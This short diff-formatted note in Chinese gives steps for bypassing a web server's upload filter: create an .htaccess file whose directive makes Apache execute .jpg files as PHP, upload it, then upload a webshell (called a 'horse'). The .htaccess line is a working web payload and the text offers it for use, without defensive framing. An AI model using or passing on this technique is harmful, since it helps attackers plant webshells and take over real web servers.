@@ -1,0 +1,8 @@
+
+
+新建.htaccess文件（如果当前系统无法建立该文件名可以在压缩包内重命名）
+写入
+
+代码:<IfModule mod_rewrite.c> AddType application/x-httpd-php .jpg </IfModule> 上传 ------上传马
+
+OK
